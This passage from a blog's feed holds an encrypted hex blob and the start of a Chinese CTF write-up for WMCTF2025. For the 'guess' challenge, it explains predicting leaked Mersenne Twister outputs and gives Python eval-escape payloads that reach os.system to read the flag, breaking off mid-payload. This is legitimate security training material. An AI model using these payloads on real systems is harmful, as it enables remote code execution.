dce840d6e62784777ac644f17e23b43f2e49a9f78cd22a70daf2621748602e01c0600be8a9c5b55af9e2493dca40d800d389390524ff6edb59594b3f32b4715c92dbf7e6df200b2618c4209b2f5ac533a7898439c70d8a7dc07efce443ae8200f6d6234731b7439b834c1e7cd44edebb37a67f2a35b6ba8d2e15717df3e87b3b7753a6592f7a50a5f401b7d497cb885d2e16586783e809e741d9c6f494728997d4ee76772e7b2bb549e1f9fec49a94c4e9f4aa2d7e9471e792b22c1935bcecc1124ca88df476cd14a4e42d678732437cf95df6b3cd34154a142fd053551dbeb2daf4d4f226effe3d4e4c2a6c74dc11a011eaa1d428e7e18c1a6e05c9f146cf6d4beb77914f203a7b438e83ba0785421014566b31c3e315d3c27e0f06344aa28950da699f87876f8ad14306b96140a92a561f2613065ac356a0949e59e2103132d3441e8f3379aaa8d48bc148faac61bcbbd815787dade6f96fdec48a34e1b98c96a5828077beef8ee3a49e5be9b17b4e9650afe793934013f9004f3bde6b1f7543c5d65ae5ad66de5e55748d60b5ff20aa7cae8c1837a57e8169ade4b1972acd192e6e460f1eae03aa0449e0302c27827cbe8b384d1e5f13979fe75505a2947c6e6b6ff4a41258872cf140d89e28836641c87d0af84e7f18d4ccc9a354518bda57626b78f4f5e2eb27b106ae37039a7e998e5e189ed59d24b92c33b732a76dee54212b6a9f36745d375d35312d4d3a7426c7573290a7c726c685c57b41994b5c545bf031641409bf65443c48c3b5ce590d776dac7fc5c0a59ef6c32d6f667407d3d8141466f2bae9053d5d6472e26e5a1fc455186dab769f7dd6d471d78544433ddb147469e193dd9ce96bc8ffe42a31e02b935ead23d0e3f1d2d715e451950588f2968b792c9c9407ab1b7c41db7bb632cfa965cea0cc5d88102f6a5650d1d0d526008df74b48922d6de083c17e3f111513f6bd159d89d08da38a9c2f8789d3219fbaa950fb334291fc1b8dd5024d61a88d010be2e9d31fa756192fbeb919bbfaf7a56c2f371477b42e43618c594b7ff506a805ec103628ee793d2edab3a9767c9d8215e9bc39f7bbc165b04e42e0e73cd1e4b84993ae18511cefad379d6a78511ce93c41a068f88b0846bd95740a2c38447c56fb1201be81037d4064e5135f6c9076880f7167dc3996fcf2b5c115c2dd37e433a81f6f071739ff2e605f967a58a863a0949d5db6b2d97e5fcf7248104d5c279e3fba60b37e5ea88148ee2a4913267937e39c2e7610d37e917d50d76a5743822c0d9f041b9bb66587ae640baddfeeb6a6eb2931241beb15e8476ce17c18a5b0d41568c672a1091181caeefbff4a82b47b724eb13b64a8d3ab41c37118bb03a4aec493aa316a18dea39007bc98ba9b48f157e76421539768865c51c71ce96639953d9efe83cb6ead3e29f0ae97e7e57d35f49590f7b1d51eaad3378748672f5d322a31a8dde56b5fa68abb7908c9b3372d94c41f9b6885972e2e021ba18c4c347e55416cd2a1dec50eab4fefe20440f9298ef61a428435cbb46bedd1dd351ab69d6faadbb912aed1f891e6b98da035b16dbddef41e8e651b2691836802c437c6f247d2258d1491755001e36d8fe7a74d3800b9d0534fe6ad217ee67c256eac024782889e89760d13fc6e1b57b0af7a2fd82be3b88a284bb040bc5d3d7240c32664160990d18a47efad70280cd22616248fc77f769398a10cae086b4989b27769c14f3230cdb5e76f7b571fb3d84ceb5ffd93a9f7ff6dea38cd3efdd53d13ecbcfe78011435e31ce91c0b78d6d2634c8e2e9619eb2e1f76771003c7afef08706c2e1fddab67828c0acc8edae1185c82c2b604fa318b2aef79539073e1b9063ab5a111b7f438b9e2cb938abeb90192cd4da682219eb687a67028398ba449df5d5f63f02020c5c607a93e5a99f4c20971f59ab8026571d80489dff93644fc3331601b024e047db25345e5d4cf79a62da7d8463562604fc625fa50face14156edf9f42ba711c96c7bb0bbd57bbe96e4135bde56ad30b0f17efd29a171239966570c7c6b349520f478682ea851b286ecb23b7e451e314544da9e2f8cf61da496183cff1455154726a9d6fc2bcb1c9e945f7810a54ae0eba010b2f514ecf553dcb2233ee2e0657f8260e7c70640f55020af1db8a71c1fcfc86fdb790c80f2e5d1d40cc5f4bd023ed0625c7cbcd68ebcecfe1fd104ac6a3deb5e1ed9155f4be2a82fa39f2ef9c5faa61ec499c8961bef87f18fb87eff5ce56fdce50dd21e2b463f7312660365e6164f1d36b0558f1608ccd0e0cc153c6d625d12f61a1fbc1c92a63e7b5f36c0087177c6cc76b255f4319a9cdfe4d26ccd67835fd3a8d7223644d03c659869b61df9507979775f85846cada1177a019368c2eb3a4223a2b27d322eb16ea624ab98679a219a53390480e6e27e757b6f6b5a801c87458f176083f086bed50b0daa703751eb1f84cd9bc9dd3ead6e16c6c30f5f109806324716a42ca5f33560641560bd0ce0769193a6ffd3d7356395b42157f08d270318322f48301acb7a0ed2905ab02b79bdc7d035be5d6d6eace44afc474f4644d8c14fcb83dc61f47ce1ef693d21521397d05b4fea1ddb0660c0f6d029f822a7891b9c8c490f8455590211b780302efa06b189951ef2f8089d028cf4723d1746509dba0f8e9af30f563cd2b0dcdfd19739be93ce48f421c5cb96988c3987c3b478fb934470bf28d2d3258cb1ce4116eadedbfa941de556a10b082831c0a4f9bc2b8a19769768032e9f7c417b5615c9d03970fcb4d178dd232cab3e78a42572436469bd4519382956ac815bac193faed09bf2d2e41570cf38c4006937c68ee41fd1481e96c0a47e090c910ee580a31a1043b25586e76e48ed0dc5b9a4b3c362bbacd1f499b725cd904cd5c6029be3c83880f9c4793b6e554e941fc906e0abfa471783af14fc2f4215d2fb91356ec296e1257734b174b7444b0e576211a0cd0c470d5f9ced8d98d1e28b5fde0fd05f6b02246dc803934aec5552929c99354a96a1128711b3ec59828da7e41d297bd264b9fe0ca16afa85ea0f793eba6d493778d2574b8c7996cb5839df20c15c02b1256c0f6450d7faa6b1403246982c5daae8bc45ab5c949084ce6096f9ec8a0712901a779202064813506cb1497d820d824095aa166f6db871a1df87f757adb9b5d1f95f5220666fa9d93484e2bd6819a248ccd08c3c9a4d9f492e95862a77645e55c6052ba8564903addbacd6e2de2c1a271afeb13bd44f925fa3a148133b82e249876a306003e2e265aabd97793abbcb125e7cde391337dd611f4151bba85bfa81a176b78d00038966d93fd1dabd78a516175d039be0882097638a5b780640da2e24d89c4f88e132a3277229c2a552b4cf0b1195fd74124e33d8a39a7adbbfbffce55567825f205e913fea1064db4b533779a7956d55c5c2fbb662dd22eb1c3beb4bae0259b91a6f7275e5d42b3a7ae1dd2df0338ed04d98ff42f0b3a4f8444bb72acba581d713d26b548d958e88c94ee0b77b686536ffdbba3c019a5611221d45c18fa57c9efd56950a1c71925a0d92f4cadab3cf8ef7451bdedcf83b72d75546d6a1b0227867c014babfdb60442cb3394fafd5d643e70846a7dfa3df397a64de2fed18c6dee692df38d605bc29fefb55ccd3b22196885ddbc6f13501fcf03f7a749286bd60b86a8e952714144a90eb09d6656d080d3d2c920220e205f759b77689a6e3547cb7fc55761ffda4cfbec22ca090ca69c1185cea01fe54a2f8797ceaf902ab8e8d0cc5394ba45711b917bb837148e2a7afd5376040f4e88e0e37814e292661624a46a813b8cba496303fe4bac23be2c226fcf912e82c10c84ce5aa0e16e0b94b702473f917e48d744daf7d189ddd67ada08452ba0fb8b52760a7908f74898e43c363377c003cf3b61e8805bef40800e4c4cfed516b96dd197a728532ec9cbc5cb124e65757cafa1170a0eae684a41459aaab0959362b9902bdc56c1c41147635a47c51e397355736c10f8f20d1aade016e215bab6f9394d1f8c459d9872d99ce0d48259d3cfbe29ef80ebc21144f753ffab011a189c2946c3dbf440c1743fcd6aa758f2a80a93124ed67d6051e6d91f146b1e4fc0e040ad03df175262f51b2ddb9ae9290e6e84602c53745e9831e4dc2a99d54507507758bbab3c4da728b54d4b3004bf514595d5ae749ac8f5427846e0c335ff46d424ed955f9ec8741e83452daba943477de182dd30a58947f4c53bef34805e694ce80b22846f893a33f5ed173d5fb02eb064c9953dbb1065e7aa26417d65719b8ae0ac178cf9481332d12e3e0a2d828052557dd8d0fd68f160b0543cf50c8c42de40b263f169deda5ee6b8dd125968dc8ed06cbf5ea6f2f534d7d097da6dba4dcedd479a59e2bf0abca02568c35c76064a35205c91a45ba42d981932649d98137fd49e0e052f844e3f4c7c33063409b6774fea00c23c4cfaf780a294c5480508b8d487d89f02688ccde9062f5c766c610f68371d5b694dea44ce598a9cb9c6246267d3584b327579f054bf370591f0170f264f5e8c55ea1b1e390bdc5173487cc690b18a5f9f1fb17b8febd01748ac919c4e372a0cf7e522af6da926e43df167703e9e91d9dcba3be582fc804c35bbc4c1e695cfc6f029503fd8c5589f733a7c629aaf453b74b6ca8a9ea258b31f2f0de1e724ea48e4e185f7f723ca3f3083056f4ed565f1320c0b19f8e966cf567744a68bea7941df39bf21e143faeae971b391beb90d893984524187625956ca7756d814dc5b2a3cebc1a7b14834a74fad5f9f0209f44a73b504f5dee38be4976427a682df9d64940071d0853b8b2eeb5c86a53aad7f109908aa62e39b5378f80624968e444e046e0557dbf4b31b781fbe1149a5e3372918573fce073844f11b7c952ee0ef222b7191f7adfedc52e1615a6630325b694ce569a6d4e31761f5d4110dfb9c6fded8eb768defa536d6dba424364bf4810b325ce3a6ada4ea946c99b2e74f500f1495a15fad8087d29280dc97560a63f3b8740d5238516fce4a5ce495218b818197d7cf30c9013a2ae95468d38913e7efbce92f7790d88de3d1b75f0bc7eccb5f7543cfe99de3a7d9ad6ed2233fbfb0ca6926e35d42e1bf4f18b2d39b94abce6e601435fd23d41c910b1b94001614d5be4200a55138b8749d39d103150ad5ae12f4e061939b2a4c427b6c6c3a76ad7dfda48fc0ffa47f032f6734655078c270f2307531bb0858dd33b2a2d6e9d171715c606e16c8635fc96b5f63b33ecabec4ca768cba274f5aa92414e6a03930981c9fc7b70dd2fc221931a49ad41c0e8f62007e358c3d724c0eaef0a7e1d0fffb5934065f5e394d22e247c34d9e79eab6945b83ead3ba2e1ed85e81df33941425c0319b7d71fea599aa978bb00ec9ba4289da91b1f0440d1346b6865111317589c43f348672629263a482a5a7721576b01181f973349c09fcaed4dabe2a63d480e4f80b804489f2b44c949fcc1ee1de48b5495d3e075c48bc482815c879109dbd4abe6583177de2301cf9ee5bc60cb6cf7f2c9a0afbaa18ac700919e2467d1c63808b47084bab13785c369a42bc6592ae7d6462aae15eff4b4a6c3a871d645194bf1930655a8d05bb4d9dc3ca556e0bf0979b968bfd830cf339ff7320710e55c6b5d08a84b8df81c45287b87084cf6ace704b1a2737af441980e89af357a517f3b6f8c32538d6daf30faade43b5f4028b3af2015e1957c9b5da38874a4ab99425d17d804a0a26ddabc86af56fffeecb49614cf6fdba6816c6577d0a50437df870d23838c5c298a2cffdad3b2f9e267e1fc91ce76f34f3069f9318d1e90365bbd5bb566178de05c1f649d8ae421b0a45fb5a1b829f9c1b2059c1535443d2962f83ccb02634bb44aa1c258d2d887f1861095054aaeaeb540379ad3413b23b5f27875c0581e74688c7c4403d6d4369d97ade4f857ab3c470bbc548c274baddcfd5f67caef382d941c10782d3534ccc5edf6a381b3668af0bbafbd9eb1c7ace5c867303a0514d5f826a86b931cf4cac9c432cea17beaeaaf48490a0bd47e85775a000f1b3d225c99ef4dffee87612a9ef8f921f4ac5c242d1148c40dcd02d346ecdb9f5cc172e8405b968f0583ebcadee1df282793af1ab719d111dc235d4fabbed964052b2eb6d97519ceaab4e8142cbbed17aeb201bca37172ff2d34781f0e87a1bdbfba016271085a62d3bdc4c62bd351ee80da712d7d410d22d994e155cf131c06b6a811f9f93e8de04a0bf96fc4efece4ad5556768717d481eddd74c4becd097301744ecc556086147cc1c1604c283db72df6a33f4023f669d2f3d19f15bd449d9cdab9867d3645766f686ab84e135073ba86698dd9e26f3ee387846e9441d9d4771d6c3115fac2a01811b587a1cdbd22238a8d14e3d03f0e7b9fca5c320c9f21398e60a7294ce3cd398ef8853db53d5347690abb5218f2bfc36dbb1ed9d6ea360d8318791a1a974e25463804fee7485aafb4a7b8f9537750701df26b56a068bfdca80a01566b74fcd8f6185f98216ed7b8d2d7f36d4d91cf1a1dad8a6542a09262c92c8a0268ae94de23af8388e7b6ecbbbad88d8c699a0b1ee95ac07bd1a4385f1d088204ef0235a9320e3aa80c05c00476afbe57c03f5ace7f6349b16d37b808b0550e9f660dd6a60d4f92f64836eb84df261d5e3eb51f63623fdd70dffb9c12b965098466cf2f1a019ae387988d69d4c756beb027c3f6ebdc912985c64b52756c5c0f3fec7b31e0006176e7ae2d0e4babe800a89b989f4a6e52f30b0a2ab3b4839ed5a665ace9617b187d3a0fc3fbb1919c354b567f974095a0ef5e882817bbfa4c36ba4542fb7e98556ddcb53b995abf748800773fbe913becea9be5c22dbc60be7040f9f22df9d0985540bae1c391314fcc724a294c8fe83b567077e02f3cfc9265749df07593fcde9d0c9d2a53d1b175d510244dce6db6fed4a6fa1f9eefbb8011dca357d9a085fb7fdd9d19da3dfbf05d20055c07100766b850eac411e3692e612877a192b3dfec8b49b34808088449b6699f33e42a3beafbfa5b0a2eeb49f40660311b152b0d77b0bb13ac9d63c0a96eaab319405b33943878f3dc1569daa658c258db5a069d7de50dc9d57784234794d60d02cd9bcc1c5832bb80ccd12cc170fde59bec78ea5108e9697a0f08fd8d36fb6fd738d9372247513c1de764065e42b5d062f8ff75ccc2af4f03065827693472e9a2158a07dcc7e4f1134e0674ae609a683f3bfd5cee08ef113545813950a674931bf19184e91bba4b0fe9416ae8fe860705b0c09bf59b57d1be20a7550d40dc41505683e073a37253f1fc5eb3b28d19a723c81d76a55b208ee26d857fb5b2a45c666d0f649597a58965402569dbcd2654a82e1401da76f248e35dbe9b9d040069a442e9282a77e8d0ab458b77af0d6d647f456aa980220edc2b01c1e1344d1ab8e328d0e1005899bc1a396864bb937e3e6b6dec8558d9ab17ae31a1ee7eb932ada5ce62165ad7c51f0e73989498567cdeece2aad65a4dd544f0f147720f5c66a14c1273b930013df1ca2177ee38f0ed3939ab7742ae5ea39955204521821e0c4823996358201ae1534885ad5573fa87b74a69cf15f72f7401790a5b26cbd13c38cc75313b9d612b5ae1508545b9328274b889185ec5e4fa4609a514c548a6f8a368ac2de442c6f4666e863c60a3c72e17b74ed154055ef2079ebd89463ab481c35803ddbcf5f9dfa66cd202bea6328eb10f9a8cd4bc5491a1ec7616abb796a6c8303308c1c425c5a415a88c577e8ead6a1133f3443f33fd1e0add5cc4540b6276752b1a62690dbc6f5d56f077bf7cd5f183168eb78909d2eb231a75a718f80b89a750e04e3c5df17e748397ffa92e64c77ea253f102961270fd4552532bec8ce5c9e3b55286588b9b9945a1488cbb56d4c6c154992154a021cb84d071101c4c76780984365dd50d988dc23ed64cc41806748c814c542d35ea1090bb45ffc70de1adab59ea7f43e0abdfa5479eba4960d9b61c7ef55cc0fd56125f0dc031d4d3d7282beef84c2599538e724e473d321ea5a4fe6d86e99e121cbddbba7048f07c9f6d1d16346cf3e767bbf48fed5c13520526f3eaf6d1787004310848d1757dd25fe8776ddc34c373669516ba6f899e6db74a927735f24e2fcdba3056b07b30d577d4faae5d36d6196435a40eeae4362cc038b1e0f84f070120b80201235a8e6037581bff9b610e1be8ce775128d9879b314b193e5533be6a9f1dce80760e0822b5e14cd82edff613de8c7e04c05dd4ef8870e488f116f6cbbb7b10f358121441ade7d755ce9ff18a7a0f09cac2774df18f613924aa8c5517289cce412d7e850ccf916f0de0b5cf5b8dd2f05b33936287a99c8a290fbd177504e2f9a63f0d19b968f10470d72b30ef73b687f95098407bc0debfa5682af3af7701e073eeddd530a101dcc819e7592b02e7b95bc61c2399971b827926d62a7a9123352c0a8fa4803276db30a4fd770141ce685bd1d139a13ad0af2cf0d90b81ef9e743628be281dccec2ae5cb0a1e9b96d542d9dca865bc78ef9f756a8c096761cbcaa1527a12ebbc59a2affd31aed3332121aeec805d93a67b42e8718f752b36ddd252bc23ec75819d839ddec04e1e07680b680c352b7b5bd32616a41d02658bafe32cd331851d0323cca3b266d8c528b1824e5cc960c53a32985c19fe0dd6a9e785998bebe3461c80c8ecb5ea9fff85a3d170ee1f75ccb4d840332bfc3fbf37a3a4665053ad88e0df1bbde963edc5e814f5682e8d581a41dfa3e6fb606194eafd30c7f971fd48541d79cda6e12b4597af1fa640b7c2b83c10371bf14fcdfa93a5a7cd65c58e1b4daa87578888961bf73626fb9cce49f3c5fb74d53e5bc63a0163689fc26370d23a8749730418fdc0730b44841fc578d40bfb0bfcb8778dea5e4eaaa48532b0b0275f2400caf3cfe932ba6be7628e0c5b4c83005250d40b5de3748e051428e4b0bfdadb1b50e43c484b26ab5c780d3e439567b975bbb55f8cb3f09e77fda61fc1044e621f5c5ee9e838e3f9f268b0d1e5cd050a0d5794ab2cbc9094fc320c8164cb371b41ec3d21c0d0e0d86f67ef021f4c519a023470a7b7224ce79156e213d7a13b45a3c0d3648ed623557771fc178e01ef94796818e1277995fb92fa5f5dbceef8e72077c555cb42e15fb60115b765e990c0eae0b42b3510949edd9b676aa5ad0288f68dbefdc9636a31b019ee86e3171365d1d1339331b0ca77e818bc9d055ed09516f22c96c41ccee2687fabf3a17c60d0b815d7c8373f72208dbe9496b9f7108430c547ecde8231f35be44a5d7eec76db69c0aa367b144eb8669f49b8387a825a66b757cdae48ed8ac295124f641e7483dc98bedc5a7932ee3b111be6a136b53ae43c3225df735276a5ffaad44689cf12680dcf9eebb556a465822f3a8f8c02ef5466843eedfcc33ccd80e54c7e13ba97b84d0b28a0f63ebaf84c3c71b9a3d8e86995f2447dc9a3779bc0e848f2028d0b406f8af436f7dba803ec4a4a74a942e1bcb5cc62dcc5a82907579319ed798690cced4e8009474275e635a2e83ed2bd2f8867dc701b9c751b64cad273468b1073cbc049a9da6d51ebced05e25500e54203d4d70579d0cce53d025dd10a86fcdd3181800529a51541896797ca521446eb70b55bbd5d252a3498fc96ffd16399ff2b3ba1c32f814163bf7742584fc0d6e3ea7245c46bd3d341ac7e9b2517aeed28f922acebc009694f8048ea2c37da3e33882a38c52663ca9d66c5135683c5851e1e77f308df9d67dfce585a838ca52dc15d7d09fc40f9767f27e907acb8123e701adae424fdcad9b6daadb05fba328630c9cb668fe810cb1f16cf35f0df317f32ac5f011249b232b701143186b9799e766dbbc04464af013eb98270a522a423b34e3555127b42c1efacdf559190e419e25a6f6668d8c213349d939b8668e732d79214383c57e73aa731c79208fe7fabf58fb861f23c6598fa97336526d42039494e97584d823be2522b2d166bb0840ab4503b9f5e72ac627ef23f755687bcf08ccf95420d8791212b50b89ccf6060365db2683811cd85227a790aa658482bb8be251779fc3b52f394d41778a69c30178eb29912a86897c1969009015e8f9b3e5b479957d4ed4651984169e9d0a045632729c932bb7c792787d2b19e39045873876e2077d85b8dae8cb3b58e40705d827259dde098e4a7a3631f8d61d434de4caa8560705be6fba88489e3e2af1b2ee84834c81decb02521ced3d0e7bd675ff97aee5b753fbe390ee009734673eb28a8152d9ab4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Here's something encrypted, password is required to continue reading. It will not be made public until the end of the game.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WMCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/09/21/WMCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/09/21/WMCTF2025-WriteUp/</id>
    <published>2025-09-20T16:18:08.000Z</published>
    <updated>2025-10-02T07:57:24.510Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/80/v2-1ba4c4523935adaa03e61a76ae5cc53b_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-8855f19886aa2a3a58e10d56076c423c_1440w.png" alt=""></p><p>以下题目，<code>*</code>代表赛中未做出来，<code>**</code>代表暂未尝试解题</p><blockquote><p>一些wp<br><a href="https://wx.zsxq.com/group/824215518412/topic/4842452512252428">MNGA</a><br><a href="https://su-team.cn/posts/f7c5eeeb.html">SU</a><br><a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">密码-糖醋小鸡块</a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="guess-79-solved"><a href="#guess-79-solved" class="headerlink" title="guess | 79 solved"></a>guess | 79 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">rd = random.Random()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(rd.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_string()</span><br><span class="line"></span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">a = generate_random_string()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">for</span> user <span class="keyword">in</span> users):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username already exists&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    user_id = generate_random_string()</span><br><span class="line"></span><br><span class="line">    users.append(&#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;User registered successfully&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id</span><br><span class="line">    &#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> users <span class="keyword">if</span> user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">                == username <span class="keyword">and</span> user[<span class="string">&#x27;password&#x27;</span>] == password), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid credentials&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Login successful&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    &#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected_api</span>():</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line"></span><br><span class="line">    key1 = data.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key1:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;key are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    key2 = generate_random_string()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(key1) == <span class="built_in">str</span>(key2):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Not Allowed:&#x27;</span> + <span class="built_in">str</span>(key2) ,</span><br><span class="line">        &#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    payload = data.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="built_in">eval</span>(payload, &#123;<span class="string">&#x27;__builtin__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access granted&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937+PyJail</strong></p><p>看到了熟悉的<code>getrandbits(32)</code>，就知道稳了</p><p>通过<code>/api</code>路由，输入<code>key</code>进行比较判断，同时<strong>猜错了</strong>还会给出题目随机生成的<code>key</code><br>那么只要我们拿到<strong>连续的624</strong>个<code>key</code>，就能拿到一轮完整的<code>state</code>，从而<strong>预测</strong>出后面的随机数，借助<code>randcrack</code>库即可</p><p><code>eval(payload, &#123;&#39;__builtin__&#39;: &#123;&#125;&#125;)</code><br>这里并不是<code>__builtins__</code>，所以没什么限制，非沙箱环境，随便打</p><p>随手复制以前<strong>继承关系</strong>逃逸的<code>payload</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> i.__name__ == <span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat 